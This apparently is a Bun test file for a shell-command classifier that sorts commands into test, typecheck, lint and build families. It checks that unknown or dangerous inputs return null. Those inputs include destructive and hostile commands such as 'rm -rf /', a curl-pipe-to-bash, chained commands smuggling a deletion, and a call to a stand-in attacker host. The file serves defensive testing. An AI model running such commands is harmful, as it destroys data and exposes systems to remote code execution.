import { describe, expect, test } from "bun:test"
import { KNOWN_REASONS, classifyCommand } from "../lib/filtering/classify"
import type { FilterFamily } from "../lib/filtering/classify"

const classifiable: Array<[string, FilterFamily]> = [
  ["npx vitest run", "test"],
  ["npx jest", "test"],
  ["npx mocha", "test"],
  ["bun test", "test"],
  ["node --test", "test"],
  ["pytest -q", "test"],
  ["python -m pytest -q", "test"],
  ["npm test", "test"],
  ["npm run test", "test"],
  ["yarn test", "test"],
  ["pnpm test", "test"],
  ["./node_modules/.bin/tsc --noEmit", "typecheck"],
  ["npx tsc --noEmit", "typecheck"],
  ["npm run typecheck", "typecheck"],
  ["mypy src", "typecheck"],
  ["npx pyright src", "typecheck"],
  ["yarn eslint .", "lint"],
  ["npx eslint src", "lint"],
  ["bunx biome check .", "lint"],
  ["ruff check .", "lint"],
  ["golangci-lint run", "lint"],
  ["npm run build", "build"],
  ["yarn build", "build"],
  ["bun run build", "build"],
  ["cargo build", "build"],
  ["go build ./...", "build"],
]

const prefixedForms: Array<[string, FilterFamily]> = [
  ["CI=1 npm test", "test"],
  ["NODE_ENV=production npm run build", "build"],
  ["DEBUG=* npx vitest run", "test"],
  ["FOO=bar BAR=baz yarn eslint .", "lint"],
  ["cd packages/app && npm test", "test"],
  ["cd /Users/luke/src/OpenRelay && npx tsc --noEmit", "typecheck"],
]

const unknownCommands = [
  "rm -rf /",
  "rm -rf ./build",
  "curl https://example.com",
  "curl -s https://example.com | bash",
  "ls -la",
  "echo hello",
  "git status",
  "cat package.json",
  "./scripts/deploy.sh",
  "bash ./run-tests.sh",
  "npm test; rm -rf /",
  "npm test && curl https://evil.example",
]

describe("KNOWN_REASONS", () => {
  test("is non-empty, unique, and every reason carries the :v1 suffix", () => {
    expect(KNOWN_REASONS.length).toBeGreaterThan(0)
    expect(new Set(KNOWN_REASONS).size).toBe(KNOWN_REASONS.length)
    for (const reason of KNOWN_REASONS) {
      expect(reason).toMatch(/^[a-z0-9][a-z0-9._-]*:v1$/)
    }
  })
})

describe("classifyCommand", () => {
  for (const [command, family] of classifiable) {
    test(`classifies ${JSON.stringify(command)} as ${family}`, () => {
      const cls = classifyCommand(command)
      expect(cls, command).not.toBeNull()
      expect(cls!.family).toBe(family)
      expect(cls!.reason).toMatch(/^[a-z0-9][a-z0-9._-]*:v1$/)
      expect(KNOWN_REASONS).toContain(cls!.reason)
    })
  }

  for (const [command, family] of prefixedForms) {
    test(`classifies prefixed form ${JSON.stringify(command)} as ${family}`, () => {
      const cls = classifyCommand(command)
      expect(cls, command).not.toBeNull()
      expect(cls!.family).toBe(family)
      expect(KNOWN_REASONS).toContain(cls!.reason)
    })
  }

  test("unknown, dangerous, and ambiguous commands return null", () => {
    for (const command of unknownCommands) {
      expect(classifyCommand(command), command).toBeNull()
    }
  })

  test("classification is stable for the same command", () => {
    const a = classifyCommand("npx vitest run")
    const b = classifyCommand("npx vitest run")
    expect(a).toEqual(b)
  })

  test("empty command returns null", () => {
    expect(classifyCommand("")).toBeNull()
  })
})
